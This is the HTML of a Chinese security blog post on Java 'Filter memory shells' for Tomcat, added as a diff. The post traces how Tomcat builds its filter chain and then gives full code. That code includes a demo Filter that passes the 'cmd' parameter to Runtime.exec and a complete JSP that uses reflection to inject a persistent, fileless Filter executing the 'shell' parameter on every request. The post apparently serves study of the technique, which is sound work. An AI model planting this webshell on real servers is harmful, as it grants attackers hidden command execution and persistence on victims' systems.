@@ -1,0 +1,490 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Java内存马之Filter内存马 | ch1e的自留地</title>
+<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Java内存马之Filter内存马 | ch1e的自留地 - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前言
+前两天去做渗透测试啦，所以关于Java的内容没有怎么学，打了两天，后续打的比较烦了，就继续学习Java，今天的内容是Java的Filter内存马
+前置知识
+Filter我们称之为过滤器，是JAVA中最常见的技术之一，一般是用来处理静态..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ch0x01e.github.io">
+  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
+  </a>
+  <h1 class="site-title">
+    ch1e的自留地
+  </h1>
+  <p class="site-description">
+    Manners maketh man
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://ch1e.cn/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Java内存马之Filter内存马
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-10-16
+              </span>
+              <span>
+                13 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="前言">前言</h1>
+<p>前两天去做渗透测试啦，所以关于Java的内容没有怎么学，打了两天，后续打的比较烦了，就继续学习Java，今天的内容是Java的Filter内存马</p>
+<h1 id="前置知识">前置知识</h1>
+<p>Filter我们称之为过滤器，是JAVA中最常见的技术之一，一般是用来处理静态Web资源，访问权限控制，记录日志等附加功能，当Tomcat收到请求后，会依次经过Listener-&gt;Filter-&gt;Servlet，在学习内存马的知识前，先来简单了解一下Tomcat处理请求的逻辑。主要看的是Wrapper中那部分，请求到达Wrapper容器时，会去先调用FilterChain，FilterChain看名字也很容易理解，就是几个Filter组成的一条链，然后再把请求发送给Servlet，这里的话他既然去调用了FilterChain，那我们是否可以通过写入一个恶意的Filter，然后调用这个恶意的Filter来触发恶意方法。因此，我们后续的任务就是要搞明白如何去注册一个恶意的Filter。<br>
+<img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174112206.png" alt="image-20220411174112206" loading="lazy"><br>
+通常情况下，注册一个Filter有三种方法，这里只讨论下面的第一种</p>
+<ol>
+<li>使用 ServletContext 的 addFilter/createFilter 方法注册；</li>
+<li>使用 ServletContextListener 的 contextInitialized 方法在服务器启动时注册</li>
+<li>使用 ServletContainerInitializer 的 onStartup 方法在初始化时注册</li>
+</ol>
+<blockquote>
+<p>Tomcat由四大容器组成，分别是Engine、Host、Context、Wrapper。这四个组件是负责关系，存在包含关系。只包含一个引擎（Engine）：</p>
+<p>Engine（引擎）：表示可运行的Catalina的servlet引擎实例，并且包含了servlet容器的核心功能。在一个服务中只能有一个引擎。同时，作为一个真正的容器，Engine元素之下可以包含一个或多个虚拟主机。它主要功能是将传入请求委托给适当的虚拟主机处理。如果根据名称没有找到可处理的虚拟主机，那么将根据默认的Host来判断该由哪个虚拟主机处理。</p>
+<p>Host （虚拟主机）：作用就是运行多个应用，它负责安装和展开这些应用，并且标识这个应用以便能够区分它们。它的子容器通常是 Context。一个虚拟主机下都可以部署一个或者多个Web App，每个Web App对应于一个Context，当Host获得一个请求时，将把该请求匹配到某个Context上，然后把该请求交给该Context来处理。主机组件类似于Apache中的虚拟主机，但在Tomcat中只支持基于FQDN(完全合格的主机名)的“虚拟主机”。Host主要用来解析web.xml。</p>
+<p>Context（上下文）：代表 Servlet 的 Context，它具备了 Servlet 运行的基本环境，它表示Web应用程序本身。Context 最重要的功能就是管理它里面的 Servlet 实例，一个Context代表一个Web应用，一个Web应用由一个或者多个Servlet实例组成。</p>
+<p>Wrapper（包装器）：代表一个 Servlet，它负责管理一个 Servlet，包括的 Servlet 的装载、初始化、执行以及资源回收。Wrapper 是最底层的容器，它没有子容器了，所以调用它的 addChild 将会报错。</p>
+</blockquote>
+<h1 id="正文">正文</h1>
+<p>为了让没有学过Java Web的师傅们更容易理解， 我这里就简单写了一个Demo<br>
+TestFilter.java</p>
+<pre><code class="language-java">import javax.servlet.*;  
+import java.io.IOException;  
+  
+public class TestFilter implements Filter {  
+    @Override  
+ public void init(FilterConfig filterConfig) throws ServletException {  
+  
+    }  
+  
+    @Override  
+ public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {  
+        filterChain.doFilter(servletRequest,servletResponse);  
+		System.out.println(servletRequest.getParameter(&quot;cmd&quot;));  
+		Runtime.getRuntime().exec(servletRequest.getParameter(&quot;cmd&quot;));  
+		System.out.println(&quot;这是TestFilter的doFilter方法&quot;);  
+ }  
+  
+    @Override  
+ public void destroy() {  
+  
+    }  
+}
+</code></pre>
+<p>web.xml</p>
+<pre><code class="language-xml">&lt;!DOCTYPE web-app PUBLIC  
+ &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;  
+ &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot; &gt;  
+  
+&lt;web-app&gt;  
+ &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;  
+ &lt;filter&gt; &lt;filter-name&gt;TestFilter&lt;/filter-name&gt;  
+ &lt;filter-class&gt;TestFilter&lt;/filter-class&gt;  
+ &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;TestFilter&lt;/filter-name&gt;  
+ &lt;url-pattern&gt;/*&lt;/url-pattern&gt;  
+ &lt;/filter-mapping&gt;
+&lt;/web-app&gt;
+</code></pre>
+<p>然后我们运行，直接GET：?cmd=calc，可以成功弹出计算器<br>
+<img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174118821.png" alt="image-20220411174118821" loading="lazy"><br>
+这就是无文件的WebShell，恶意代码存放在Filter里，每次去对服务器发起请求会调用到Filter里的内容，实现无文件Webshell，通过上面的Demo，师傅们应该会对Filter的作用有个比较好的了解吧，如果没有也没关系，多看几遍就懂了。我们如果在正常情况下，如果想要让目标执行这个Filter，肯定需要构造恶意的Filter，并且在web.xml里对他进行配置，否则并不会执行这个Filter，但是我们手动去修改他的web.xml文件并不现实，因此现在需要做的就是想办法如何去构造这个恶意的Filter并且不在web.xml里配置但是要达到配置的效果。因此我们需要通过一步步调试去研究代码中是如何获取想要调用的Filter的信息。</p>
+<p>先在我们上面的代码的<code>filterChain.doFilter(servletRequest,servletResponse);</code>打上断点，然后开始调试</p>
+<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174123050.png" alt="image-20220411174123050" loading="lazy"></figure>
+<p>我们往前寻找，跟进<code>ApplicationFilterChain</code>的<code>internalDoFilter</code>方法，此时初始化了一个<code>ApplicationFilterConfig</code>类，其中的内容如下图。</p>
+<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174126601.png" alt="image-20220411174126601" loading="lazy"></figure>
+<p>并且此时的<code>ApplicationFilterConfig</code>类中的filters属性中包含了我们的filter信息，第二个filter是tomcat自带的filter</p>
+<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174129669.png" alt="image-20220411174129669" loading="lazy"></figure>
+<p>具体代码实现如下，先初始化了一个filterConfig，并且使用自身的filter对filterConfig进行了赋值，在上面说到了filters是包含了我们的filter信息，然后通过<code>filterConfig</code>的<code>getFilter</code>方法获得到了对应的filter，并且直接调用了filter的doFilter方法</p>
+<pre><code class="language-java">private void internalDoFilter(ServletRequest request,
+                              ServletResponse response)
+    throws IOException, ServletException {
+
+    // Call the next filter if there is one
+    if (pos &lt; n) {
+        ApplicationFilterConfig filterConfig = filters[pos++];
+        try {
+            Filter filter = filterConfig.getFilter();
+
+            if (request.isAsyncSupported() &amp;&amp; &quot;false&quot;.equalsIgnoreCase(
+                    filterConfig.getFilterDef().getAsyncSupported())) {
+                request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);
+            }
+            if( Globals.IS_SECURITY_ENABLED ) {
+                final ServletRequest req = request;
+                final ServletResponse res = response;
+                Principal principal =
+                    ((HttpServletRequest) req).getUserPrincipal();
+
+                Object[] args = new Object[]{req, res, this};
+                SecurityUtil.doAsPrivilege (&quot;doFilter&quot;, filter, classType, args, principal);
+            } else {
+                filter.doFilter(request, response, this);
+            }
+        } catch (IOException | ServletException | RuntimeException e) {
+            throw e;
+        } catch (Throwable e) {
+            e = ExceptionUtils.unwrapInvocationTargetException(e);
+            ExceptionUtils.handleThrowable(e);
+            throw new ServletException(sm.getString(&quot;filterChain.filter&quot;), e);
+        }
+        return;
+    }
+</code></pre>
+<p>大概的流程有了:ApplicationFilterChain中包含了所有的filter信息，然后给到不同的filterConfig，通过filterConfig获取到对应的Filter，然后执行Filter的doFilter方法，因此我们就要去研究ApplicationFilterChain的filter信息是从哪里获取到的，只要从找到获取filter信息的位置，我们就可以达到我们的目标了</p>
+<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174133717.png" alt="image-20220411174133717" loading="lazy"></figure>
+<p>继续往回走，来到<code>StandardContextValve#invoke</code>方法，由于源代码太长，这里就不放出了，只给出关键代码</p>
+<pre><code class="language-java">ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);
+</code></pre>
+<p>在如上位置调用<code>ApplicationFilterFactory.createFilterChain</code>获得了一个filterChain，接着就调用了<code>filterChain.doFilter</code>，其中并没有对filterChain进行赋值的操作，那就只有一种可能，说明在上一步<code>ApplicationFilterFactory.createFilterChain</code>的时候就已经把filter的信息填入了，继续跟进<code>ApplicationFilterFactory.createFilterChain</code></p>
+<pre><code class="language-java">public static ApplicationFilterChain createFilterChain(ServletRequest request,
+        Wrapper wrapper, Servlet servlet) {
+
+    // If there is no servlet to execute, return null
+    if (servlet == null)
+        return null;
+
+    // Create and initialize a filter chain object
+    ApplicationFilterChain filterChain = null;
+    if (request instanceof Request) {
+        Request req = (Request) request;
+        if (Globals.IS_SECURITY_ENABLED) {
+            // Security: Do not recycle
+            filterChain = new ApplicationFilterChain();
+        } else {
+            filterChain = (ApplicationFilterChain) req.getFilterChain();
+            if (filterChain == null) {
+                filterChain = new ApplicationFilterChain();
+                req.setFilterChain(filterChain);
+            }
+        }
+    } else {
+        // Request dispatcher in use
+        filterChain = new ApplicationFilterChain();
+    }
+
+    filterChain.setServlet(servlet);
+    filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());
+
+    // Acquire the filter mappings for this Context
+    StandardContext context = (StandardContext) wrapper.getParent();
+    FilterMap filterMaps[] = context.findFilterMaps();
+
+    // If there are no filter mappings, we are done
+    if ((filterMaps == null) || (filterMaps.length == 0))
+        return (filterChain);
+
+    // Acquire the information we will need to match filter mappings
+    DispatcherType dispatcher =
+            (DispatcherType) request.getAttribute(Globals.DISPATCHER_TYPE_ATTR);
+
+    String requestPath = null;
+    Object attribute = request.getAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR);
+    if (attribute != null){
+        requestPath = attribute.toString();
+    }
+
+    String servletName = wrapper.getName();
+
+    // Add the relevant path-mapped filters to this filter chain
+    for (int i = 0; i &lt; filterMaps.length; i++) {
+        if (!matchDispatcher(filterMaps[i] ,dispatcher)) {
+            continue;
+        }
+        if (!matchFiltersURL(filterMaps[i], requestPath))
+            continue;
+        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
+            context.findFilterConfig(filterMaps[i].getFilterName());
+        if (filterConfig == null) {
+            // FIXME - log configuration problem
+            continue;
+        }
+        filterChain.addFilter(filterConfig);
+    }
+
+    // Add filters that match on servlet name second
+    for (int i = 0; i &lt; filterMaps.length; i++) {
+        if (!matchDispatcher(filterMaps[i] ,dispatcher)) {
+            continue;
+        }
+        if (!matchFiltersServlet(filterMaps[i], servletName))
+            continue;
+        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
+            context.findFilterConfig(filterMaps[i].getFilterName());
+        if (filterConfig == null) {
+            // FIXME - log configuration problem
+            continue;
+        }
+        filterChain.addFilter(filterConfig);
+    }
+
+    // Return the completed filter chain
+    return filterChain;
+}
+</code></pre>
+<p>首先在<code>filterChain = (ApplicationFilterChain) req.getFilterChain();</code>处通过getFilterChain获得req的filterChain，如果为null，则手动设置一个</p>
+<figure data-type="image" tabindex="5"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174139107.png" alt="image-20220411174139107" loading="lazy"></figure>
+<p>然后是设置了一些filterChain的信息，继续往下一行是<code>FilterMap filterMaps[] = context.findFilterMaps();</code>，从context中获取到我们的FilterMaps,FilterMaps的具体内容如下，他包含了filterName和urlParttern<img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174143259.png" alt="image-20220411174143259" loading="lazy"></p>
+<p>继续往下，是一个for循环，这里为了方便观看重新放一下源代码</p>
+<pre><code class="language-java">for (int i = 0; i &lt; filterMaps.length; i++) {
+    if (!matchDispatcher(filterMaps[i] ,dispatcher)) {
+        continue;
+    }
+    if (!matchFiltersURL(filterMaps[i], requestPath))
+        continue;
+    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
+        context.findFilterConfig(filterMaps[i].getFilterName());
+    if (filterConfig == null) {
+        // FIXME - log configuration problem
+        continue;
+    }
+    filterChain.addFilter(filterConfig);
+}
+</code></pre>
+<p>遍历了filterMaps，通过<code>context.findFilterConfig(filterMaps[i].getFilterName());</code>从filterMaps数组中找到对应的ApplicationFilterConfig然后给到filterConfig，并且通过<code>filterChain.addFilter(filterConfig);</code>添加到filterChain中。上面提到，我们是从context中获取到我们的FilterMaps，这里也师傅们也可以不用进行深入研究，具体可以看下面的调试结果，context中存有我们的filterConfigs，filterDefs和filterMaps</p>
+<figure data-type="image" tabindex="6"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174148412.png" alt="image-20220411174148412" loading="lazy"></figure>
+<ul>
+<li>FilterConfigs:存放filteConfig的数组，filterConfig中存放着一些Filter对象信息和filterDef</li>
+<li>FilterDefs:存放FilterDef的数组，FilterDef存放着过滤器名，实例等信息</li>
+<li>FilterMaps:存放着FilterMap的数组，FilterMap主要存放FilterName和对应的URLPattern</li>
+</ul>
+<p>因此我们只需要通过反射去构造filterDef，filterMap，filterConfig对象，然后把filterConfig加到filterConfigs中即可完成内存马的注入，除此之外，我们还必须要反射创建三个对象，分别是servletContext，applicationContext，standardContext</p>
+<figure data-type="image" tabindex="7"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174157754.png" alt="image-20220411174157754" loading="lazy"></figure>
+<p>把index.jsp删除后，依旧可以执行</p>
+<figure data-type="image" tabindex="8"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174200972.png" alt="image-20220411174200972" loading="lazy"></figure>
+<pre><code class="language-java">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContextFacade&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
+&lt;%@ page import=&quot;java.util.HashMap&quot; %&gt;
+&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%
+    //反射创建servletContext
+    ServletContext servletContext = request.getServletContext();
+    ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletContext;
+    Field applicationContextFacadeContext = applicationContextFacade.getClass().getDeclaredField(&quot;context&quot;);
+    applicationContextFacadeContext.setAccessible(true);
+    //反射创建applicationContext
+    ApplicationContext applicationContext = (ApplicationContext) applicationContextFacadeContext.get(applicationContextFacade);
+    Field applicationContextContext = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
+    applicationContextContext.setAccessible(true);
+    //反射创建standardContext
+    StandardContext standardContext = (StandardContext) applicationContextContext.get(applicationContext);
+
+
+    //创建filterConfigs
+    Field filterConfigs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);
+    filterConfigs.setAccessible(true);
+    HashMap hashMap = (HashMap) filterConfigs.get(standardContext);
+    String filterName = &quot;Filter&quot;;
+    if (hashMap.get(filterName)==null){
+
+
+        Filter filter = new Filter() {
+            @Override
+            public void init(FilterConfig filterConfig) throws ServletException {
+                System.out.println(&quot;注入初始化&quot;);
+            }
+
+
+            @Override
+            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+                servletRequest.setCharacterEncoding(&quot;utf-8&quot;);
+                servletResponse.setCharacterEncoding(&quot;utf-8&quot;);
+                servletResponse.setContentType(&quot;text/html;charset=UTF-8&quot;);
+                filterChain.doFilter(servletRequest,servletResponse);
+                System.out.println(servletRequest.getParameter(&quot;shell&quot;));
+                Runtime.getRuntime().exec(servletRequest.getParameter(&quot;shell&quot;));
+                System.out.println(&quot;过滤中。。。&quot;);
+            }
+
+
+            @Override
+            public void destroy() {
+//                Filter.super.destroy();
+            }
+        };
+        //构造filterDef对象
+        FilterDef filterDef = new FilterDef();
+        filterDef.setFilter(filter);
+        filterDef.setFilterName(filterName);
+        filterDef.setFilterClass(filter.getClass().getName());
+        standardContext.addFilterDef(filterDef);
+
+
+        //构造filterMap对象
+        FilterMap filterMap = new FilterMap();
+        filterMap.addURLPattern(&quot;/*&quot;);
+        filterMap.setFilterName(filterName);
+        filterMap.setDispatcher(DispatcherType.REQUEST.name());
+        standardContext.addFilterMapBefore(filterMap);
+
+
+        //构造filterConfig
+        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
+        constructor.setAccessible(true);
+        ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
+
+
+        //将filterConfig添加到filterConfigs中，即可完成注入
+        hashMap.put(filterName,applicationFilterConfig);
+        response.getWriter().println(&quot;successfully&quot;);
+    }
+%&gt;
+</code></pre>
+<h1 id="补充">补充</h1>
+<p>关于如上jsp内存马，可能有些师傅不太理解反射获取servletContext，applicationContext，standardContext的过程，其实通过<code>request.getServletContext()</code>获取的ServletContext其实是ApplicationContextFacade对象，他对applicationContext进行了一个封装，ApplicationContextFacade中的context属性就是applicationContext对象，所以上文是通过<code>ApplicationContext applicationContext = (ApplicationContext) applicationContextFacadeContext.get(applicationContextFacade);</code>来获取applicationContext ，ApplicationContext实例中又包含了StandardContext实例，所以是通过<code>StandardContext standardContext = (StandardContext) applicationContextContext.get(applicationContext);</code>来获取standardContext ，各位师傅参考下图就明白了</p>
+<figure data-type="image" tabindex="9"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174206924.png" alt="image-20220411174206924" loading="lazy"></figure>
+<h1 id="参考">参考</h1>
+<p>https://javasec.org/javaweb/MemoryShell/<br>
+https://xz.aliyun.com/t/10888</p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzIxMjEwNTc4NA==&amp;mid=2652991099&amp;idx=1&amp;sn=a6c34bb344f105eb98fc6943c7439331&amp;scene=21#wechat_redirect">JSP Webshell那些事 -- 攻击篇(下)</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">前置知识</a></li>
+<li><a href="#%E6%AD%A3%E6%96%87">正文</a></li>
+<li><a href="#%E8%A1%A5%E5%85%85">补充</a></li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ch0x01e.github.io/post/fastjson-fan-xu-lie-hua-zhu-ru-nei-cun-ma/">
+              <h3 class="post-title">
+                Fastjson反序列化注入内存马
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
